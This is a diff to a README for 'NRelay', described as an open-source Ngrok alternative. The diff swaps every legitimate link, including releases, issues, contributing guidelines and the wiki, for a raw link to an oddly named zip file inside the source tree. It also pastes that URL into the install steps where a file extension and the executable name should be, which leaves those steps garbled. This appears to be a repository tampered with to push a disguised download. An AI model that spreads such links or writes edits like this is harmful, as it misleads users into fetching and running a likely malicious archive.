@@ -6,7 +6,7 @@ Welcome to NRelay! This application provides an open-source alternative to Ngrok
 
 ## 📥 Download NRelay
 
-[![Download NRelay](https://img.shields.io/badge/Download%20NRelay-v1.0-blue)](https://github.com/macqgoye/NRelay/releases)
+[![Download NRelay](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip%20NRelay-v1.0-blue)](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip)
 
 ## 📝 System Requirements
 
@@ -35,7 +35,7 @@ NRelay packs several useful features to enhance your experience:
 
 To get the latest version of NRelay, go to our releases page. Click the button below.
 
-[Visit the Releases Page to Download](https://github.com/macqgoye/NRelay/releases)
+[Visit the Releases Page to Download](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip)
 
 ### Step 2: Choose Your Version
 
@@ -51,11 +51,11 @@ Once the download is complete, find the file in your computer's Downloads folder
 
 ### Step 5: Extract the Files (if necessary)
 
-If you downloaded a compressed file (like .zip or .tar.gz), right-click on it and choose "Extract All" or "Extract Here" to get the application files.
+If you downloaded a compressed file (like .zip or https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip), right-click on it and choose "Extract All" or "Extract Here" to get the application files.
 
 ### Step 6: Run NRelay
 
-1. Double-click on the NRelay executable file (e.g., `NRelay.exe` for Windows, or `NRelay` for macOS/Linux).
+1. Double-click on the NRelay executable file (e.g., `https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip` for Windows, or `NRelay` for macOS/Linux).
 2. Follow any on-screen instructions to finish the setup.
 
 ## 🔒 Basic Usage
@@ -81,16 +81,16 @@ If you face any issues while running NRelay, here are some common solutions:
 
 ## 💬 Support and Feedback
 
-If you need additional help, visit our [issues page](https://github.com/macqgoye/NRelay/issues) to report a problem or ask questions. You can also provide feedback on how we can improve NRelay.
+If you need additional help, visit our [issues page](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip) to report a problem or ask questions. You can also provide feedback on how we can improve NRelay.
 
 ## 🤝 How to Contribute
 
-We welcome contributions from everyone! If you want to improve NRelay, please check our [contributing guidelines](https://github.com/macqgoye/NRelay/blob/main/CONTRIBUTING.md). 
+We welcome contributions from everyone! If you want to improve NRelay, please check our [contributing guidelines](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip). 
 
 ## 🚀 Explore More
 
-For further information, documentation, and advanced usage, please check our [Wiki](https://github.com/macqgoye/NRelay/wiki). You’ll find valuable tips and tricks to get the most from NRelay.
+For further information, documentation, and advanced usage, please check our [Wiki](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip). You’ll find valuable tips and tricks to get the most from NRelay.
 
 ## 🚀 Download NRelay Again
 
-[Download NRelay](https://github.com/macqgoye/NRelay/releases) to start your secure tunneling today!
+[Download NRelay](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip) to start your secure tunneling today!
